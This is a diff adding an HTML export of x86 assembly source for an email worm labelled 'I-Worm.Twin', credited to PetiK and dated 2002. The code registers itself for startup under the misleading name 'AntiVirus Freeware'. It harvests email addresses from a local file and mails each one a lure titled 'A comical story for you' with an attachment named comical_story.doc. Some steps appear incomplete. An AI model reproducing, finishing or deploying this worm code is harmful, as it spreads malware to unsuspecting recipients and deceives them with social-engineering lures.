@@ -1,0 +1,248 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment #</span><span class="sc0">
+</span><span class="sc1">; Name : I-Worm.Twin</span><span class="sc0">
+</span><span class="sc1">; Author : PetiK</span><span class="sc0">
+</span><span class="sc1">; Date : January 30th 2002 - February 1st 2002</span><span class="sc0">
+</span><span class="sc1">; Size : 6656 bytes</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; Action : See yourself. It's not complex.</span><span class="sc0">
+</span><span class="sc1">; #</span><span class="sc0">
+
+</span><span class="sc2">.586p</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+</span><span class="sc9">.code</span><span class="sc0">
+
+</span><span class="sc5">JUMPS</span><span class="sc0">
+
+</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
+</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">endm</span><span class="sc0">
+
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">myinclude.inc</span><span class="sc0">
+
+</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_worm</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"AntiVirus Freeware"</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000002h</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SHSetValueA</span><span class="sc0">
+
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\twin.vbs"</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathname</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\NetInfo.doc"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathname</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+
+</span><span class="sc5">verif_inet</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inet</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">verif_inet</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\backup.win"</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_worm</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_w1</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_w2</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
+    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">end_w3</span><span class="sc0">
+
+</span><span class="sc5">scan_mail</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">p_c</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">" "</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">car_s</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">entr1</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">entr2</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"#"</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_mail</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
+    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_a</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
+    </span><span class="sc5">not_a</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_c</span><span class="sc0">
+    </span><span class="sc5">car_s</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_c</span><span class="sc0">
+    </span><span class="sc5">entr1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+        </span><span class="sc6">stosb</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
+        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">scan_mail</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_mail</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">scan_mail</span><span class="sc0">
+    </span><span class="sc5">entr2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+        </span><span class="sc6">stosb</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">scan_mail</span><span class="sc0">
+    </span><span class="sc5">f_mail</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">end_w3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
+</span><span class="sc5">end_w2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+</span><span class="sc5">end_w1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+
+</span><span class="sc5">end_worm</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+</span><span class="sc5">send_mail</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sess</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">MAPISendMail</span><span class="sc0">
+    </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">orig_worm</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">pathname</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">mail_addr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">inet</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">sess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">subject</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"A comical story for you."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">body</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I send you a comical story found on the Net."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"Best Regards. You friend."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"comical_story.doc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">Message</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subject</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgFrom</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgTo</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Attach</span><span class="sc0">
+
+</span><span class="sc5">MsgFrom</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">MsgTo</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">Attach</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pathname</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
+</span><span class="sc5">end</span></div></body>
+</html>
